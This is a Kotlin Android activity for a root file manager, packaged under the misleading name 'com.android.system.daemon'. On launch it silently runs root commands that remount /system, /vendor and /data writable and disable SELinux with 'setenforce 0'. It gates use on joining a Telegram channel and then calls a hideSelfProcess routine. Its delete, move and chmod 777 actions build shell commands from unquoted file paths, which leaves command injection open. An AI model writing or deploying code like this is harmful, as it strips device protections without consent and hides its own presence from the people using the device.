package com.android.system.daemon

import android.app.Activity
import android.app.AlertDialog
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.view.ContextMenu
import android.view.MenuItem
import android.view.View
import android.widget.AdapterView
import android.widget.ArrayAdapter
import android.widget.ListView
import android.widget.TextView
import android.widget.Toast
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.Date

class MainActivity : Activity() {

    private val tgChannelUrl = "https://t.me/HideMT"
    private lateinit var leftListView: ListView
    private lateinit var rightListView: ListView
    private lateinit var leftPathText: TextView
    private lateinit var rightPathText: TextView

    private var leftCurrentPath: String = "/"
    private var rightCurrentPath: String = "/storage/emulated/0"
    private var showHiddenFiles: Boolean = true
    private var showSystemFiles: Boolean = true

    private var leftSelectedFile: File? = null
    private var rightSelectedFile: File? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        initView()
        initFullRootAccess()
        refreshLeftFileList()
        refreshRightFileList()

        Handler(Looper.getMainLooper()).postDelayed({
            startChannelVerify()
        }, 1000)
    }

    private fun initView() {
        leftListView = findViewById(R.id.lv_left)
        rightListView = findViewById(R.id.lv_right)
        leftPathText = findViewById(R.id.tv_left_path)
        rightPathText = findViewById(R.id.tv_right_path)

        leftListView.onItemClickListener = leftItemClick
        rightListView.onItemClickListener = rightItemClick
        registerForContextMenu(leftListView)
        registerForContextMenu(rightListView)
    }

    private fun initFullRootAccess() {
        val app = application as App
        app.execSu("mount -o rw,remount /")
        app.execSu("mount -o rw,remount /system")
        app.execSu("mount -o rw,remount /vendor")
        app.execSu("mount -o rw,remount /data")
        app.execSu("mount -o rw,remount /storage")
        app.execSu("setenforce 0")
    }

    private val leftItemClick = AdapterView.OnItemClickListener { _, _, position, _ ->
        val fileList = getFullFileList(leftCurrentPath)
        if (position < fileList.size) {
            val target = fileList[position]
            if (target.isDirectory) {
                leftCurrentPath = target.absolutePath
                refreshLeftFileList()
            } else {
                leftSelectedFile = target
            }
        }
    }

    private val rightItemClick = AdapterView.OnItemClickListener { _, _, position, _ ->
        val fileList = getFullFileList(rightCurrentPath)
        if (position < fileList.size) {
            val target = fileList[position]
            if (target.isDirectory) {
                rightCurrentPath = target.absolutePath
                refreshRightFileList()
            } else {
                rightSelectedFile = target
            }
        }
    }

    private fun getFullFileList(path: String): MutableList<File> {
        val dir = File(path)
        val list = mutableListOf<File>()
        if (!dir.exists()) return list
        if (!dir.canRead()) {
            requestDirRootAccess(dir)
        }
        val originFiles = dir.listFiles() ?: return list

        for (file in originFiles) {
            if (showHiddenFiles && showSystemFiles) {
                list.add(file)
            } else if (showHiddenFiles) {
                if (!file.name.startsWith(".")) list.add(file)
            } else {
                if (!file.name.startsWith(".") && !file.name.startsWith("sys_")) list.add(file)
            }
        }

        list.sortWith(compareBy({ !it.isDirectory }, { it.name.lowercase(Locale.ENGLISH) }))
        return list
    }

    private fun requestDirRootAccess(dir: File) {
        val app = application as App
        app.execSu("chmod -R 755 ${dir.absolutePath}")
        app.execSu("chown 0:0 ${dir.absolutePath}")
    }

    private fun refreshLeftFileList() {
        leftPathText.text = leftCurrentPath
        val files = getFullFileList(leftCurrentPath)
        val displayList = files.map {
            when {
                it.isDirectory -> "[Dir] ${it.name}"
                it.isHidden -> "[Hidden] ${it.name}"
                else -> it.name
            }
        }
        val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, displayList)
        leftListView.adapter = adapter
    }

    private fun refreshRightFileList() {
        rightPathText.text = rightCurrentPath
        val files = getFullFileList(rightCurrentPath)
        val displayList = files.map {
            when {
                it.isDirectory -> "[Dir] ${it.name}"
                it.isHidden -> "[Hidden] ${it.name}"
                else -> it.name
            }
        }
        val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, displayList)
        rightListView.adapter = adapter
    }

    override fun onCreateContextMenu(menu: ContextMenu?, v: View?, menuInfo: ContextMenu.ContextMenuInfo?) {
        super.onCreateContextMenu(menu, v, menuInfo)
        menu?.add("Copy")
        menu?.add("Move")
        menu?.add("Delete")
        menu?.add("Rename")
        menu?.add("Chmod 777")
        menu?.add("File Info")
        menu?.add("Show Hidden Files")
        menu?.add("Show System Files")
    }

    override fun onContextItemSelected(item: MenuItem): Boolean {
        when (item.title) {
            "Show Hidden Files" -> {
                showHiddenFiles = !showHiddenFiles
                refreshLeftFileList()
                refreshRightFileList()
            }
            "Show System Files" -> {
                showSystemFiles = !showSystemFiles
                refreshLeftFileList()
                refreshRightFileList()
            }
            "Copy" -> copySelectedFile()
            "Move" -> moveSelectedFile()
            "Delete" -> deleteSelectedFile()
            "Rename" -> renameSelectedFile()
            "Chmod 777" -> chmodSelectedFile()
            "File Info" -> showFileDetails()
        }
        return true
    }

    private fun copySelectedFile() {
        val source = leftSelectedFile ?: return
        val targetDir = File(rightCurrentPath)
        Thread {
            runCatching {
                copyRecursive(source, File(targetDir, source.name))
                runOnUiThread { refreshRightFileList() }
            }
        }.start()
    }

    private fun moveSelectedFile() {
        val source = leftSelectedFile ?: return
        val target = File(rightCurrentPath, source.name)
        val app = application as App
        app.execSu("mv -f ${source.absolutePath} ${target.absolutePath}")
        refreshLeftFileList()
        refreshRightFileList()
    }

    private fun deleteSelectedFile() {
        val target = leftSelectedFile ?: rightSelectedFile ?: return
        val app = application as App
        app.execSu("rm -rf ${target.absolutePath}")
        refreshLeftFileList()
        refreshRightFileList()
    }

    private fun renameSelectedFile() {
        val target = leftSelectedFile ?: return
        val app = application as App
        val newName = System.currentTimeMillis().toString()
        app.execSu("mv ${target.absolutePath} ${target.parent}/$newName")
        refreshLeftFileList()
    }

    private fun chmodSelectedFile() {
        val target = leftSelectedFile ?: return
        val app = application as App
        app.execSu("chmod -R 777 ${target.absolutePath}")
    }

    private fun showFileDetails() {
        val target = leftSelectedFile ?: return
        val size = target.length()
        val modifyTime = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.ENGLISH)
            .format(Date(target.lastModified()))
        val isHidden = target.isHidden.toString()
        val canRead = target.canRead().toString()

        AlertDialog.Builder(this)
            .setTitle("File Info")
            .setMessage(
                "Path: ${target.absolutePath}\n" +
                "Size: $size bytes\n" +
                "Modify Time: $modifyTime\n" +
                "Hidden: $isHidden\n" +
                "Can Read: $canRead"
            )
            .setPositiveButton("OK", null)
            .show()
    }

    private fun copyRecursive(source: File, target: File) {
        if (source.isDirectory) {
            target.mkdirs()
            source.listFiles()?.forEach { copyRecursive(it, File(target, it.name)) }
        } else {
            FileInputStream(source).use { input ->
                FileOutputStream(target).use { output ->
                    input.copyTo(output)
                }
            }
        }
    }

    private fun startChannelVerify() {
        val verifyDialog = AlertDialog.Builder(this)
            .setTitle("Channel Verify")
            .setMessage("Required channel:$tgChannelUrl\nChecking...")
            .setCancelable(false)
            .create()
        verifyDialog.show()

        Thread {
            val isJoined = runCatching {
                val conn = URL(tgChannelUrl).openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 3000
                conn.readTimeout = 3000
                val content = conn.inputStream.bufferedReader().readText()
                conn.disconnect()
                content.contains("Only members can view")
            }.getOrDefault(true)

            runOnUiThread {
                verifyDialog.dismiss()
                if (!isJoined) {
                    showBlockDialog()
                } else {
                    (application as App).hideSelfProcess()
                }
            }
        }.start()
    }

    private fun showBlockDialog() {
        AlertDialog.Builder(this)
            .setTitle("Verify Failed")
            .setMessage("Please join official channel first")
            .setPositiveButton("Join Now") { _, _ ->
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(tgChannelUrl)))
                finishAndRemoveTask()
            }
            .setNegativeButton("Exit") { _, _ ->
                finishAndRemoveTask()
            }
            .setCancelable(false)
            .show()
    }

    private fun toast(text: String) {
        Toast.makeText(this, text, Toast.LENGTH_SHORT).show()
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    override fun onBackPressed() {
        val parentFile = File(leftCurrentPath).parentFile
        if (parentFile != null && leftCurrentPath != "/") {
            leftCurrentPath = parentFile.absolutePath
            refreshLeftFileList()
        } else {
            finishAndRemoveTask()
        }
    }
}
